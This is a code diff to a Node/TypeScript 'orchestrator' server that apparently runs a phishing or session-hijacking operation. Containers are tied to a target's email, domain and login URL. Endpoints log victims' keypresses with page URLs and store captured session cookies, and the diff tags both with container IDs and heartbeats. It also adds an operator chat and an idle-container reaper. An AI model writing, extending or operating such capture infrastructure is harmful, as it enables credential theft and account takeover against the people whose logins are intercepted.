@@ -5,6 +5,8 @@ import Database from "better-sqlite3";
 import { fileURLToPath } from "url";
 import dns from "dns";
 import { promisify } from "util";
+import { createServer } from "http";
+import { WebSocketServer, WebSocket } from "ws";
 
 const resolveMx = promisify(dns.resolveMx);
 
@@ -13,10 +15,17 @@ const __dirname = path.dirname(__filename);
 
 async function startServer() {
   const app = express();
-  const PORT = 3000;
+  const PORT = process.env.PORT || 3000;
 
   // Initialize Database
-  const db = new Database("orchestrator.db");
+  let db: Database.Database;
+  try {
+    db = new Database("orchestrator.db");
+  } catch (err) {
+    console.error("[Orchestrator] Failed to initialize database:", err);
+    // Fallback to in-memory if persistent DB fails
+    db = new Database(":memory:");
+  }
   db.exec(`
     CREATE TABLE IF NOT EXISTS domains (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -32,7 +41,16 @@ async function startServer() {
       status TEXT,
       ip_address TEXT,
       remote_url TEXT,
+      last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    );
+    CREATE TABLE IF NOT EXISTS scaling_metrics (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      total_cpu REAL,
+      total_memory REAL,
+      active_containers INTEGER,
+      strategy TEXT,
+      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
     );
     CREATE TABLE IF NOT EXISTS audit_logs (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -58,6 +76,13 @@ async function startServer() {
       description TEXT,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     );
+    CREATE TABLE IF NOT EXISTS ops_chat (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      user_id TEXT,
+      username TEXT,
+      message TEXT,
+      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+    );
   `);
 
   // Seed default data if empty
@@ -78,10 +103,92 @@ async function startServer() {
     insert.run("192.168.1.100", "DROP", "Restricted external operator");
   }
 
+  const server = createServer(app);
+  const wss = new WebSocketServer({ server });
+
+  // WebSocket Chat Logic
+  wss.on("connection", (ws) => {
+    console.log("[WS] New connection established");
+    
+    // Send latest messages on connect
+    const history = db.prepare("SELECT * FROM ops_chat ORDER BY timestamp ASC LIMIT 50").all();
+    ws.send(JSON.stringify({ type: "history", data: history }));
+
+    ws.on("message", (raw) => {
+      try {
+        const payload = JSON.parse(raw.toString());
+        if (payload.type === "message") {
+          const { user_id, username, message } = payload.data;
+          
+          const stmt = db.prepare(`
+            INSERT INTO ops_chat (user_id, username, message)
+            VALUES (?, ?, ?)
+          `);
+          const info = stmt.run(user_id, username, message);
+          
+          const newMessage = {
+            id: info.lastInsertRowid,
+            user_id,
+            username,
+            message,
+            timestamp: new Date().toISOString()
+          };
+
+          // Broadcast to everyone
+          const broadcastPayload = JSON.stringify({ type: "message", data: newMessage });
+          wss.clients.forEach((client) => {
+            if (client.readyState === WebSocket.OPEN) {
+              client.send(broadcastPayload);
+            }
+          });
+        }
+      } catch (err) {
+        console.error("[WS] Error processing message:", err);
+      }
+    });
+  });
+
+  // Background Scaling Manager
+  setInterval(() => {
+    // 1. Calculate Simulated System Metrics
+    const active = db.prepare("SELECT count(*) as count FROM containers WHERE status = 'running'").get() as { count: number };
+    const simulatedCpu = Math.min(95, active.count * 15 + (Math.random() * 5));
+    const simulatedMem = Math.min(16000, active.count * 512 + (Math.random() * 200));
+
+    db.prepare(`
+      INSERT INTO scaling_metrics (total_cpu, total_memory, active_containers, strategy)
+      VALUES (?, ?, ?, ?)
+    `).run(simulatedCpu, simulatedMem, active.count, simulatedCpu > 80 ? 'THROTTLING' : 'OPTIMIZED');
+
+    // 2. Idle Reaper (Scale Down)
+    // Containers with no activity for > 5 minutes are terminated
+    const idleLimitMinutes = 5;
+    const idleContainers = db.prepare(`
+      SELECT id FROM containers 
+      WHERE status = 'running' 
+      AND last_active < DATETIME('now', '-${idleLimitMinutes} minutes')
+    `).all() as { id: string }[];
+
+    idleContainers.forEach(container => {
+      console.log(`[ScalingManager] Auto-terminating idle container (IDLE > ${idleLimitMinutes}m): ${container.id}`);
+      db.prepare("UPDATE containers SET status = 'terminated' WHERE id = ?").run(container.id);
+    });
+  }, 30000); // Check every 30 seconds
+
   app.use(express.json());
+
+  app.get("/api/health", (req, res) => {
+    res.json({ 
+      status: "ok", 
+      time: new Date().toISOString(),
+      env: process.env.NODE_ENV || "development",
+      port: PORT
+    });
+  });
 
   app.get("/api/firewall-rules", (req, res) => {
     const rules = db.prepare("SELECT * FROM firewall_rules ORDER BY created_at DESC").all();
+    const protocol = req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
     res.json(rules);
   });
 
@@ -147,13 +254,19 @@ async function startServer() {
   });
 
   app.post("/api/audit-logs", (req, res) => {
-    const { key, char, url, title } = req.body || {};
-    // Extract container ID from the request headers or IP if possible
-    // For simplicity in this demo, we'll log it as 'active_session'
+    const { key, char, url, title, container_id } = req.body || {};
+    const targetId = container_id || 'active_session';
+    
     db.prepare(`
       INSERT INTO audit_logs (container_id, type, content, url)
       VALUES (?, ?, ?, ?)
-    `).run('active_session', 'keypress', char || key, url);
+    `).run(targetId, 'keypress', char || key, url);
+
+    // Heartbeat the container activity
+    if (targetId !== 'active_session') {
+      db.prepare("UPDATE containers SET last_active = CURRENT_TIMESTAMP WHERE id = ?").run(targetId);
+    }
+    
     res.status(204).send();
   });
 
@@ -166,16 +279,23 @@ async function startServer() {
     const cookie = req.body;
     if (!cookie || !cookie.name) return res.status(400).send();
     
+    const container_id = cookie.container_id || 'unknown';
     db.prepare(`
       INSERT INTO captured_sessions (container_id, cookie_name, cookie_value, domain, raw_json)
       VALUES (?, ?, ?, ?, ?)
     `).run(
-      cookie.container_id || 'unknown',
+      container_id,
       cookie.name,
       cookie.value,
       cookie.domain,
       JSON.stringify(cookie)
     );
+
+    // Heartbeat
+    if (container_id !== 'unknown') {
+      db.prepare("UPDATE containers SET last_active = CURRENT_TIMESTAMP WHERE id = ?").run(container_id);
+    }
+
     res.status(204).send();
   });
 
@@ -265,8 +385,8 @@ async function startServer() {
 
     // Persist container
     db.prepare(`
-      INSERT INTO containers (id, name, email, domain, login_url, status, ip_address, remote_url)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+      INSERT INTO containers (id, name, email, domain, login_url, status, ip_address, remote_url, last_active)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
     `).run(containerId, containerName, email, domain, login_url, "running", ipAddress, remoteUrl);
 
     // Simulate "starting container" logic
@@ -300,8 +420,13 @@ async function startServer() {
     });
   }
 
-  app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+  app.get("/api/scaling-metrics", (req, res) => {
+    const metrics = db.prepare("SELECT * FROM scaling_metrics ORDER BY timestamp DESC LIMIT 50").all();
+    res.json(metrics);
+  });
+
+  server.listen(Number(PORT), "0.0.0.0", () => {
+    console.log(`Server running on port ${PORT} (0.0.0.0)`);
   });
 }
 
